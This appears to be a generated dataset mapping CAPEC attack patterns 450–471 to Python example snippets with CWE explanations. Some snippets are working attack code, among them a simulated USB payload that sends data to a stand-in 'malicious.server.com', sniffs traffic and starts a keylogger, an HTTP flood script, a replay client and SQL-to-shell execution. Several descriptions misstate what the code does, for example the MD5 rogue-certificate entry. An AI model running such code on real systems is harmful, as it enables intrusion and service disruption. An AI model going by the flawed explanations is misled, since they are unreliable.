        "description": "This Python code snippet demonstrates several security weaknesses related to the deprecated CAPEC pattern 'Malware Propagation via USB Stick' and its associated CWEs. The `handle_user_input` function checks for improper handling of Windows device names (CWE-67) and raises an error if such names are found. It also includes a benign function that hides malicious behavior (CWE-506), simulating a Trojan horse. The code attempts to import a non-existent module to illustrate a call to a non-ubiquitous API (CWE-589). Additionally, the `DeviceFirmware` class represents a device with non-updateable firmware (CWE-1277), demonstrating the inability to patch vulnerabilities. This code encapsulates the idea of hidden malicious code and improper handling of inputs, which are key aspects of the deprecated CAPEC pattern."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "import os\nimport shutil\n\n# CWE-426: Untrusted Search Path\n# CWE-67: Improper Handling of Windows Device Names\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n\n# Malicious DLL payload\nmalicious_dll = \"malicious.dll\"\n\n# Path to USB drive (untrusted search path)\nusb_path = \"E:\\\\\"\n\n# Function to replicate malicious DLL to USB drive\ndef replicate_to_usb(dll_path, usb_path):\n    try:\n        # CWE-67: Improper Handling of Windows Device Names\n        if \"CON\" in usb_path or \"AUX\" in usb_path:\n            raise ValueError(\"Invalid device name in path\")\n        # Copy malicious DLL to USB drive\n        shutil.copy(dll_path, os.path.join(usb_path, os.path.basename(dll_path)))\n        print(f\"Replicated {dll_path} to {usb_path}\")\n    except Exception as e:\n        print(f\"Error replicating to USB: {e}\")\n\n# Main function to execute the replication\nif __name__ == \"__main__\":\n    replicate_to_usb(malicious_dll, usb_path)\n",
        "description": "This Python code snippet demonstrates a simplified version of malware propagation via USB, embodying the main idea of the deprecated CAPEC pattern. The code includes a malicious DLL payload and attempts to replicate it to a USB drive, representing CWE-509 (Replicating Malicious Code). It also checks for improper handling of Windows device names (CWE-67) and uses an untrusted search path (CWE-426) by targeting the USB drive. The code highlights the potential risks of replicating malicious code and the importance of handling paths and device names securely."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "import os\nimport platform\n\n# CWE-589: Call to Non-ubiquitous API\nif platform.system() == 'Windows':\n    import win32api\n    def get_drive_list():\n        drives = win32api.GetLogicalDriveStrings()\n        drives = drives.split('\\000')[:-1]\n        return drives\nelse:\n    def get_drive_list():\n        return os.listdir('/media')\n\n# CWE-507: Trojan Horse\n# This function appears to list files but also executes hidden malicious code\ndef list_files(drive):\n    files = os.listdir(drive)\n    # Hidden malicious code\n    with open(os.path.join(drive, 'malware.txt'), 'w') as f:\n        f.write('This is a hidden malware file.')\n    return files\n\n# CWE-1277: Firmware Not Updateable\n# Simulating a device with non-updateable firmware\nclass Device:\n    def __init__(self, firmware_version):\n        self.firmware_version = firmware_version\n        self.updateable = False\n\n    def update_firmware(self, new_version):\n        if self.updateable:\n            self.firmware_version = new_version\n        else:\n            print('Firmware update not supported.')\n\n# Main function to demonstrate the attack\nif __name__ == '__main__':\n    drives = get_drive_list()\n    for drive in drives:\n        print(f'Files in {drive}: {list_files(drive)}')\n\n    device = Device('1.0')\n    device.update_firmware('2.0')",
        "description": "This Python code snippet demonstrates a scenario where malware propagates via an infected peripheral device, embodying the deprecated CAPEC pattern. The code includes vulnerabilities related to the mentioned CWEs:\n\n1. **CWE-589: Call to Non-ubiquitous API** - The code uses platform-specific APIs to list drives, which may not be available on all systems, causing potential issues.\n2. **CWE-507: Trojan Horse** - The `list_files` function appears to list files on a drive but also writes a hidden malware file, representing a Trojan Horse.\n3. **CWE-1277: Firmware Not Updateable** - The `Device` class simulates a device with non-updateable firmware, highlighting the risk of unpatchable vulnerabilities.\n\nThe main idea is to show how malware can propagate through infected peripheral devices by exploiting these weaknesses."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "import ctypes\n\n# Simulate malicious hardware interaction\nclass MaliciousHardware:\n    def __init__(self):\n        self.registers = (ctypes.c_uint32 * 10)()  # Simulate hardware registers\n        self.debug_mode = False\n\n    def activate_debug_mode(self):\n        # CWE-1313: Activate debug logic at runtime\n        self.debug_mode = True\n        print(\"Debug mode activated\")\n\n    def write_to_register(self, index, value):\n        if self.debug_mode:\n            # CWE-1262: Improper access control for register interface\n            self.registers[index] = value\n            print(f\"Register {index} set to {value}\")\n        else:\n            print(\"Access denied: Debug mode not active\")\n\n    def execute_malicious_code(self):\n        # CWE-506: Embedded malicious code\n        if self.debug_mode:\n            print(\"Executing malicious code...\")\n            # Simulate malicious behavior\n            for i in range(len(self.registers)):\n                self.registers[i] = 0xDEADBEEF\n            print(\"Registers corrupted with malicious values\")\n        else:\n            print(\"Cannot execute malicious code: Debug mode not active\")\n\n# Simulate an attack\nhardware = MaliciousHardware()\nhardware.activate_debug_mode()  # Activate debug mode to bypass protections\nhardware.write_to_register(0, 1234)  # Write to a register\nhardware.execute_malicious_code()  # Execute malicious code",
        "description": "This Python code snippet simulates a scenario where an adversary has inserted malicious logic into hardware. The `MaliciousHardware` class represents a piece of hardware with memory-mapped I/O registers. The `activate_debug_mode` method (CWE-1313) allows the adversary to enable debug mode at runtime, bypassing normal protections. The `write_to_register` method demonstrates improper access control (CWE-1262) by allowing register writes only when debug mode is active. The `execute_malicious_code` method contains embedded malicious code (CWE-506) that corrupts the hardware registers with malicious values. This code embodies the main idea of the CAPEC by showing how malicious logic can be hidden in hardware and activated to achieve negative impacts."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "import socket\nimport struct\n\n# CWE-294: Authentication Bypass by Capture-replay\n# This code snippet demonstrates a simple replay attack where captured network traffic is replayed to bypass authentication.\n\n# Captured authentication packet (example data)\ncaptured_packet = b'\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a'\n\n# Function to send the captured packet to the server\ndef replay_attack(server_ip, server_port):\n    try:\n        # Create a socket connection\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((server_ip, server_port))\n        \n        # Send the captured packet\n        s.sendall(captured_packet)\n        \n        # Receive the response from the server\n        response = s.recv(1024)\n        print(f'Received response: {response}')\n        \n        # Close the socket connection\n        s.close()\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\nserver_ip = '192.168.1.100'\nserver_port = 12345\nreplay_attack(server_ip, server_port)",
        "description": "This Python code snippet demonstrates a replay attack, which is a form of authentication bypass (CWE-294). The code captures a network packet containing authentication data and replays it to the server to bypass authentication. This embodies the main idea of the CAPEC, which involves malicious logic insertion, by showing how an attacker can exploit captured data to gain unauthorized access. The code creates a socket connection to the server, sends the captured packet, and prints the server's response, illustrating the potential impact of such an attack."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "class HardwareComponent:\n    def __init__(self, firmware_version):\n        self.firmware_version = firmware_version\n        self.updateable = False\n        self.undocumented_feature = self._hidden_function()\n\n    def _hidden_function(self):\n        # Malicious code embedded within the hardware component\n        return 'Malicious Logic Activated'\n\n    def get_firmware_version(self):\n        return self.firmware_version\n\n    def execute_undocumented_feature(self):\n        return self.undocumented_feature\n\n# Example usage\ncomponent = HardwareComponent('1.0.0')\nprint(component.get_firmware_version())\nprint(component.execute_undocumented_feature())",
        "description": "This Python code snippet represents a hardware component class that embodies the main idea of the CAPEC 'Modification of Existing Components with Counterfeit Hardware' and related CWEs. The class includes a firmware version attribute, a flag indicating that the component is not updateable (CWE-1329), and an undocumented feature (CWE-1242) that contains malicious logic (CWE-506). The hidden function '_hidden_function' simulates the embedded malicious code, which is activated when the undocumented feature is executed. This code demonstrates how a hardware component can be compromised by including malicious logic and undocumented features, making it vulnerable to exploitation."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "import random\n\nclass HardwareComponent:\n    def __init__(self, id, data):\n        self.id = id\n        self.data = data\n        self.malicious = False\n\n    def inject_malicious_code(self):\n        if random.choice([True, False]):\n            self.malicious = True\n            self.data = 'malicious_code'\n\n    def read_data(self):\n        if self.malicious:\n            return 'Error: Malicious code detected'\n        return self.data\n\n# Simulate hardware components\ncomponents = [HardwareComponent(i, f'data_{i}') for i in range(5)]\n\n# Inject malicious code into one of the components\nfor component in components:\n    component.inject_malicious_code()\n\n# Read data from components\nfor component in components:\n    print(f'Component {component.id}: {component.read_data()}')",
        "description": "This Python code snippet simulates the insertion of malicious logic into hardware components, embodying the main idea of the deprecated CAPEC. The `HardwareComponent` class represents a hardware component with an ID and data. The `inject_malicious_code` method randomly decides whether to inject malicious code into the component, changing its data to 'malicious_code' and setting a flag. The `read_data` method checks if the component contains malicious code and returns an error message if it does. The code then creates a list of hardware components, attempts to inject malicious code into them, and reads their data, demonstrating how malicious logic can be inserted and detected in hardware components. This example also touches on CWE-506 (Embedded Malicious Code) and CWE-1334 (Unauthorized Error Injection Can Degrade Hardware Redundancy) by showing how malicious code can be embedded and how it can affect the system's operation."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "import ctypes\n\n# Simulate a protected memory region\nprotected_memory = (ctypes.c_char * 1024).from_buffer(bytearray(1024))\n\n# Simulate an aliased memory region with improper access control\naliased_memory = (ctypes.c_char * 1024).from_buffer(protected_memory)\n\n# Function to write to the aliased memory region\ndef write_to_aliased_memory(data):\n    for i in range(len(data)):\n        aliased_memory[i] = data[i]\n\n# Malicious code that writes to the aliased memory region\nmalicious_code = b'\\x90' * 100  # NOP sled as an example\nwrite_to_aliased_memory(malicious_code)\n\n# Check if the protected memory has been altered\nprint(protected_memory[:100])",
        "description": "This Python code snippet demonstrates a simplified version of the 'Infected Memory' attack pattern described in the CAPEC. It simulates a protected memory region and an aliased memory region with improper access control. The `write_to_aliased_memory` function allows writing to the aliased memory region, which inadvertently modifies the protected memory region due to the aliasing. The `malicious_code` variable contains a NOP sled, representing malicious logic that is written to the aliased memory region. Finally, the code prints the first 100 bytes of the protected memory to show that it has been altered. This example highlights the vulnerability where improper access control on aliased memory regions can lead to unauthorized modifications of protected memory."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "import os\nimport socket\nimport subprocess\n\n# Simulate malicious code embedded in a USB device\nclass MaliciousUSB:\n    def __init__(self):\n        self.payload = 'malicious_payload'\n\n    def execute_payload(self):\n        # Simulate data exfiltration via wireless connection\n        self.exfiltrate_data()\n        # Simulate network sniffing\n        self.sniff_network()\n        # Simulate keystroke logging\n        self.log_keystrokes()\n\n    def exfiltrate_data(self):\n        sensitive_data = 'Sensitive Information'\n        # Transmit sensitive data in cleartext (CWE-319)\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect(('malicious.server.com', 8080))\n            s.sendall(sensitive_data.encode('utf-8'))\n\n    def sniff_network(self):\n        # Simulate network sniffing (CWE-1299)\n        os.system('tcpdump -i wlan0 -w /tmp/sniffed_data.pcap')\n\n    def log_keystrokes(self):\n        # Simulate keystroke logging (CWE-506)\n        subprocess.run(['logkeys', '--start'])\n\n# Simulate the USB device being plugged into a system\nusb_device = MaliciousUSB()\nusb_device.execute_payload()",
        "description": "This Python code snippet simulates a malicious USB device that, when plugged into a system, executes a series of malicious actions. The `MaliciousUSB` class contains methods to exfiltrate sensitive data, sniff network traffic, and log keystrokes. The `exfiltrate_data` method demonstrates CWE-319 by transmitting sensitive information in cleartext over a network. The `sniff_network` method simulates network sniffing, representing CWE-1299 by exploiting an unprotected network interface. The `log_keystrokes` method simulates keystroke logging, representing CWE-506 by embedding malicious code that logs user input. This code embodies the main idea of the CAPEC by demonstrating how a USB device can be used to perform sophisticated attacks, including data exfiltration, network sniffing, and keystroke logging."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "import os\n\n# CWE-1282: Assumed-Immutable Data is Stored in Writable Memory\n# Simulating a bootloader stored in writable memory\nbootloader = \"Original Bootloader Code\"\n\n# CWE-506: Embedded Malicious Code\n# Malicious code that an attacker might inject\nmalicious_code = \"Malicious Bootloader Code\"\n\n# Function to simulate flashing the memory with malicious code\n# CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\n# No access control checks before flashing\ndef flash_memory(new_code):\n    global bootloader\n    bootloader = new_code\n    print(\"Memory flashed with new code.\")\n\n# Simulating an attack where the bootloader is replaced with malicious code\nflash_memory(malicious_code)\n\n# CWE-1319: Improper Protection against Electromagnetic Fault Injection (EM-FI)\n# This example does not cover EM-FI directly but represents a lack of protection\n# CWE-1342: Information Exposure through Microarchitectural State after Transient Execution\n# This example does not cover microarchitectural state but represents a lack of proper security mechanisms\n\n# Output the current state of the bootloader\nprint(\"Current bootloader code:\", bootloader)",
        "description": "This Python code snippet simulates a flash memory attack where an attacker replaces the original bootloader code with malicious code. The code demonstrates CWE-1282 by storing the bootloader in writable memory, CWE-506 by embedding malicious code, and CWE-1274 by lacking access control when flashing the memory. The function `flash_memory` allows the bootloader to be overwritten without any security checks, representing a vulnerability that could be exploited in a real-world scenario. The code also hints at the lack of protection against more sophisticated attacks like EM-FI (CWE-1319) and microarchitectural state exposure (CWE-1342), although these are not directly implemented in the snippet."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "import hashlib\nfrom cryptography import x509\nfrom cryptography.hazmat.primitives import hashes\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption\nfrom cryptography.hazmat.primitives.asymmetric.padding import PKCS1v15\n\n# Generate RSA keys\nprivate_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)\npublic_key = private_key.public_key()\n\n# Create a certificate signing request (CSR) with weak hash algorithm (MD5)\ncsr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([\n    x509.NameAttribute(x509.NameOID.COMMON_NAME, u'example.com'),\n])).sign(private_key, hashes.MD5())\n\n# Simulate a trusted CA signing the CSR\nsigned_csr = csr.public_bytes(Encoding.DER)\n\n# Create a rogue certificate with the same hash\nrogue_csr = x509.CertificateSigningRequestBuilder().subject_name(x509.Name([\n    x509.NameAttribute(x509.NameOID.COMMON_NAME, u'rogue.com'),\n])).sign(private_key, hashes.MD5())\n\n# Use the signed blob from the trusted CA to validate the rogue certificate\nrogue_cert = x509.load_der_x509_certificate(signed_csr)\n\n# Verify the rogue certificate (this should not be trusted, but due to hash collision, it is)\ntry:\n    public_key.verify(\n        rogue_cert.signature,\n        rogue_cert.tbs_certificate_bytes,\n        PKCS1v15(),\n        hashes.MD5()\n    )\n    print(\"Rogue certificate is incorrectly validated!\")\nexcept Exception as e:\n    print(\"Validation failed: \", e)\n",
        "description": "This Python code snippet demonstrates the concept of creating a rogue certification authority certificate by exploiting a weak hashing algorithm (MD5). The code generates an RSA key pair and creates a certificate signing request (CSR) using MD5. It simulates a trusted certificate authority (CA) signing the CSR. Then, it creates a rogue CSR with the same hash and uses the signed blob from the trusted CA to validate the rogue certificate. Due to the hash collision, the rogue certificate is incorrectly validated, illustrating the vulnerability described in the CAPEC. This example highlights the risks associated with using broken or risky cryptographic algorithms (CWE-327) and improper certificate validation (CWE-295)."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET', 'POST'])\ndef search():\n    # Vulnerable to HTTP Parameter Pollution\n    query = request.args.get('query') or request.form.get('query')\n    # Simulate a command execution with the query parameter\n    command = f\"search_tool --query {query}\"\n    print(f\"Executing command: {command}\")\n    # In a real scenario, this would execute the command\n    return f\"Search results for: {query}\"\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple Flask web application that is vulnerable to HTTP Parameter Pollution (HPP). The '/search' endpoint accepts both GET and POST requests and retrieves the 'query' parameter from the request. The code then constructs a command string using the 'query' parameter without proper neutralization, making it susceptible to argument injection (CWE-88) and improper handling of extra parameters (CWE-235). Additionally, if sensitive information were included in the query string, it would be exposed (CWE-598). This example highlights the risks associated with HPP and related weaknesses in handling HTTP parameters."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "import hashlib\n\n# Simulate a weak hash function (e.g., MD5)\ndef weak_hash(data):\n    return hashlib.md5(data.encode()).hexdigest()\n\n# Simulate a web service API that uses a weak hash for authentication\ndef web_service_api(data, provided_hash):\n    secret_token = 'secret'\n    valid_hash = weak_hash(data + secret_token)\n    if provided_hash == valid_hash:\n        return 'Authenticated'\n    else:\n        return 'Authentication Failed'\n\n# Adversary's attack leveraging hash extension weakness\n# Original data and hash\noriginal_data = 'user=admin&timestamp=123456'\noriginal_hash = weak_hash(original_data + 'secret')\n\n# Adversary modifies the data\nmodified_data = 'user=admin&timestamp=123456&role=admin'\n\n# Adversary generates a new hash without knowing the secret\n# This is a simplified example and does not perform actual hash extension attack\n# In a real scenario, the adversary would use hash extension techniques\nnew_hash = weak_hash(modified_data + 'secret')\n\n# Adversary sends the modified data and new hash to the web service\nresponse = web_service_api(modified_data, new_hash)\nprint(response)",
        "description": "This Python code snippet demonstrates a simplified version of a Web Services API Signature Forgery attack leveraging a hash function extension weakness. The web service uses a weak hash function (MD5) for authentication. An adversary can modify the parameters of the request and generate a new hash without knowing the secret token, exploiting the weakness of the hash function. The code shows how the adversary can bypass authentication by creating a new valid hash for the modified data, highlighting the vulnerabilities described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "import requests\nimport time\n\n# List of URLs to test\nurls = [\n    'http://example.com/resource1',\n    'http://example.com/resource2',\n    'http://example.com/resource3'\n]\n\n# Function to measure response time\ndef measure_response_time(url):\n    start_time = time.time()\n    response = requests.get(url)\n    end_time = time.time()\n    return end_time - start_time\n\n# Measure and print response times\nfor url in urls:\n    response_time = measure_response_time(url)\n    print(f'Response time for {url}: {response_time} seconds')",
        "description": "This Python code snippet demonstrates a basic implementation of the 'Cross-Domain Search Timing' attack. The script sends HTTP GET requests to a list of URLs and measures the time taken for each request to complete. By analyzing the response times, an attacker can infer information about the server's state or the resources being accessed, even though they cannot directly read the server's responses due to the same-origin policy. This approach leverages CWE-385 (Covert Timing Channel) and CWE-208 (Observable Timing Discrepancy) to extract information based on timing differences. The code does not include CSRF or XSS vulnerabilities directly but provides a foundation for understanding how timing attacks can be used to gather information across domains."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "from Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad, unpad\nimport os\n\n# Key and IV generation\nkey = os.urandom(16)\niv = os.urandom(16)\ncipher = AES.new(key, AES.MODE_CBC, iv)\n\n# Encrypt some data\nplaintext = b'This is a secret message'\npadded_plaintext = pad(plaintext, AES.block_size)\nciphertext = cipher.encrypt(padded_plaintext)\n\n# Decrypt function with padding oracle vulnerability\n\ndef decrypt(ciphertext):\n    try:\n        cipher = AES.new(key, AES.MODE_CBC, iv)\n        decrypted_data = cipher.decrypt(ciphertext)\n        unpad(decrypted_data, AES.block_size)  # This can raise a ValueError if padding is incorrect\n        return 'Decryption successful'\n    except ValueError as e:\n        return 'Padding error'\n\n# Simulate an attacker using the padding oracle\nfor i in range(256):\n    modified_ciphertext = bytearray(ciphertext)\n    modified_ciphertext[-1] = i  # Modify the last byte\n    result = decrypt(bytes(modified_ciphertext))\n    if result == 'Padding error':\n        print(f'Byte {i} caused a padding error')\n    else:\n        print(f'Byte {i} did not cause a padding error')",
        "description": "This Python code snippet demonstrates a padding oracle attack vulnerability. The code encrypts a plaintext message using AES in CBC mode and then attempts to decrypt it. The decryption function reveals whether a padding error occurred, which can be exploited by an attacker. The attacker modifies the last byte of the ciphertext and observes the response to determine if a padding error occurred. This information can be used to decrypt the ciphertext without knowing the encryption key. The code embodies the main idea of CAPEC-463 (Padding Oracle Crypto Attack) and highlights CWE-209 (Generation of Error Message Containing Sensitive Information) by leaking padding error information."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "import os\nimport json\nimport base64\nfrom http.cookies import SimpleCookie\n\n# Simulate multiple storage locations\nstorage_locations = [\n    'local_storage.json',\n    'session_storage.json',\n    'cookie_storage.txt',\n    'flash_storage.txt'\n]\n\n# Function to create an evercookie\ndef create_evercookie(value):\n    encoded_value = base64.b64encode(value.encode()).decode()\n    for location in storage_locations:\n        with open(location, 'w') as f:\n            f.write(encoded_value)\n\n# Function to read the evercookie\ndef read_evercookie():\n    for location in storage_locations:\n        if os.path.exists(location):\n            with open(location, 'r') as f:\n                return base64.b64decode(f.read()).decode()\n    return None\n\n# Function to delete the evercookie\ndef delete_evercookie():\n    for location in storage_locations:\n        if os.path.exists(location):\n            os.remove(location)\n\n# Function to restore the evercookie if any part is still present\ndef restore_evercookie():\n    value = read_evercookie()\n    if value:\n        create_evercookie(value)\n\n# Example usage\ncreate_evercookie('sensitive_data')\ndelete_evercookie()\nrestore_evercookie()\n\n# Simulate cookie usage\ncookie = SimpleCookie()\ncookie['session'] = 'sensitive_data'\nprint(cookie.output())",
        "description": "This Python code snippet demonstrates the concept of an 'evercookie', a highly persistent cookie that remains on a user's machine even after attempts to delete it. The code simulates multiple storage locations (local storage, session storage, cookies, and flash storage) to store the cookie data. The `create_evercookie` function encodes and writes the cookie value to all storage locations. The `read_evercookie` function reads the cookie value from any available storage location. The `delete_evercookie` function attempts to delete the cookie from all storage locations. The `restore_evercookie` function checks if the cookie exists in any storage location and restores it to all locations if found. The example usage demonstrates creating, deleting, and restoring the evercookie. Additionally, it shows how a cookie might be used in a web application, highlighting the potential security risks associated with persistent cookies containing sensitive information, as described in the related CWEs."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "import requests\n\nclass TransparentProxy:\n    def __init__(self, target_url):\n        self.target_url = target_url\n\n    def forward_request(self, client_request):\n        # Forward the client's request to the target URL\n        response = requests.get(self.target_url, headers=client_request.headers)\n        return response\n\n# Example usage\nproxy = TransparentProxy('http://example.com')\nclient_request = requests.Request('GET', 'http://proxy.com', headers={'User-Agent': 'client-browser'})\nresponse = proxy.forward_request(client_request)\nprint(response.content)",
        "description": "This Python code snippet demonstrates a simple transparent proxy that forwards client requests to a target URL. The `TransparentProxy` class takes a `target_url` as an argument and has a method `forward_request` that forwards the client's request to this target URL. The proxy does not modify the request headers, which can lead to issues such as 'Unintended Proxy or Intermediary' (CWE-441) and 'Inconsistent Interpretation of HTTP Requests' (CWE-444). The code also does not handle sensitive information properly, which can lead to 'Improper Removal of Sensitive Information Before Storage or Transfer' (CWE-212). This example embodies the main idea of CAPEC-160, where a transparent proxy intercepts and forwards requests and responses without the client's knowledge."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "import requests\n\n# Vulnerable function to fetch data from a URL\n# CWE-923: Improper Restriction of Communication Channel to Intended Endpoints\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-942: Permissive Cross-domain Policy with Untrusted Domains\n\ndef fetch_data(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        return response.text\n    return None\n\n# Example usage\n# This could be intercepted by an attacker in a MITM scenario\n# CAPEC-94: Adversary in the Middle Attack\n# CAPEC: Bypass Same Origin Policy\n\nurl = 'http://example.com/data'\ndata = fetch_data(url)\nif data:\n    print(data)\nelse:\n    print('Failed to fetch data')",
        "description": "This Python code snippet demonstrates a vulnerable function `fetch_data` that fetches data from a given URL using the `requests` library. The function does not use TLS (HTTPS), making it susceptible to Man-in-the-Middle (MITM) attacks (CAPEC-94). This can allow an attacker to intercept and manipulate the communication between the client and the server, effectively bypassing the Same Origin Policy. The code also embodies several CWEs: CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) as it does not ensure the endpoint's authenticity, CWE-300 (Channel Accessible by Non-Endpoint) as it does not verify the identity of actors at both ends, and CWE-942 (Permissive Cross-domain Policy with Untrusted Domains) as it does not restrict communication to trusted domains."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "import requests\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/get_user_info')\ndef get_user_info():\n    social_network_url = 'https://socialnetwork.com/api/user_info'\n    session_cookie = request.cookies.get('session')\n    if session_cookie:\n        headers = {'Cookie': f'session={session_cookie}'}\n        response = requests.get(social_network_url, headers=headers)\n        if response.status_code == 200:\n            user_info = response.json()\n            return render_template_string('<h1>User Info</h1><p>{{ user_info }}</p>', user_info=user_info)\n    return 'Failed to retrieve user info', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that retrieves user information from a social networking site using an active session cookie. The '/get_user_info' endpoint attempts to extract the session cookie from the incoming request and uses it to make an authenticated request to the social network's API. If successful, it displays the retrieved user information. This code embodies the main idea of CAPEC-111 (Cross Site Identification) by harvesting identifying information from an active session. The code also highlights several related CWEs: CWE-352 (CSRF) as it does not verify the request's origin, CWE-359 (Exposure of Private Personal Information) by potentially exposing user info, CWE-384 (Session Fixation) by reusing session cookies, and CWE-598 (Use of GET Request Method With Sensitive Query Strings) by using GET requests to retrieve sensitive information."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "from flask import Flask, request, make_response\n\napp = Flask(__name__)\n\n@app.route('/vulnerable', methods=['GET'])\ndef vulnerable():\n    css_url = request.args.get('css_url')\n    if css_url:\n        response = make_response(f'<link rel=\"stylesheet\" type=\"text/css\" href=\"{css_url}\">')\n        response.headers['Content-Type'] = 'text/html'\n        return response\n    return 'No CSS URL provided', 400\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application endpoint using Flask. The endpoint '/vulnerable' accepts a 'css_url' parameter from the query string and includes it in a link tag within the HTML response. This demonstrates the CAPEC 'Generic Cross-Browser Cross-Domain Theft' by allowing an attacker to inject a malicious CSS URL. The CSS file could be crafted to exploit the browser's handling of CSS, potentially stealing sensitive data. The related CWEs are represented by the lack of proper input validation (CWE-707), improper handling of quotes (CWE-149), and the potential for cross-site scripting (CWE-79) due to the direct inclusion of user input in the HTML response."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "import threading\nimport requests\nimport time\n\n# Target URL\nurl = 'http://example.com'\n\n# Function to perform HTTP DoS attack\ndef http_dos_attack():\n    while True:\n        try:\n            # Open a connection and keep it alive\n            response = requests.get(url, headers={'Connection': 'keep-alive'})\n            time.sleep(1)  # Simulate delay to keep the connection open\n        except Exception as e:\n            print(f'Error: {e}')\n\n# Number of threads to simulate multiple connections\nnum_threads = 100\n\n# Create and start threads\nthreads = []\nfor i in range(num_threads):\n    thread = threading.Thread(target=http_dos_attack)\n    thread.start()\n    threads.append(thread)\n\n# Join threads\nfor thread in threads:\n    thread.join()",
        "description": "This Python code snippet demonstrates a simple HTTP DoS attack by opening multiple HTTP connections to a target URL and keeping them alive indefinitely. The code uses threading to simulate multiple connections, each sending a GET request with the 'Connection: keep-alive' header to keep the session open. This can exhaust the server's resources, leading to a denial of service. The code embodies the main idea of CAPEC-125 (HTTP DoS) and highlights related CWEs such as CWE-770 (Allocation of Resources Without Limits or Throttling) and CWE-410 (Insufficient Resource Pool)."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "import sqlite3\nimport os\n\n# CWE-89: SQL Injection vulnerability\nuser_input = \"' OR '1'='1\"  # Malicious input\n\n# CWE-250: Execution with Unnecessary Privileges\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# CWE-619: Dangling Database Cursor\ncursor.execute(f\"SELECT * FROM users WHERE username = '{user_input}'\")\n\n# CWE-564: SQL Injection via ORM (simulated with direct SQL execution)\nfor row in cursor.fetchall():\n    print(row)\n\n# CWE-250: Dropping into a command shell\nos.system('ls')  # Potentially dangerous command execution\n\n# CWE-250: Creating a user-defined function to call system-level libraries\nconn.create_function('system', 1, os.system)\ncursor.execute(\"SELECT system('ls')\")\n\n# CWE-619: Not closing the cursor properly\n# cursor.close()  # This line is intentionally commented out to simulate the vulnerability\nconn.close()",
        "description": "This Python code snippet demonstrates a scenario where an attacker can leverage SQL injection (CWE-89) to gain unauthorized access to a database. The code connects to an SQLite database with unnecessary privileges (CWE-250) and executes a vulnerable SQL query using user input. The cursor is not closed properly, leading to a dangling cursor vulnerability (CWE-619). Additionally, the code shows how an attacker can drop into a command shell and execute system-level commands (CWE-250) and create user-defined functions to call system-level libraries. This snippet embodies the main idea of CAPEC-Expanding Control over the Operating System from the Database by illustrating how database access can be exploited to compromise the underlying operating system."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "import os\nimport ctypes\n\n# Simulate an application loading a library\n# Vulnerable to Search Order Hijacking\n\ndef load_library(lib_name):\n    # Uncontrolled Search Path Element (CWE-427)\n    # Untrusted Search Path (CWE-426)\n    current_dir = os.getcwd()\n    lib_path = os.path.join(current_dir, lib_name)\n    \n    if os.path.exists(lib_path):\n        ctypes.CDLL(lib_path)\n        print(f\"Loaded library from {lib_path}\")\n    else:\n        print(f\"Library {lib_name} not found in {current_dir}\")\n\n# Attacker can place a malicious 'example.dll' in the current directory\nload_library('example.dll')",
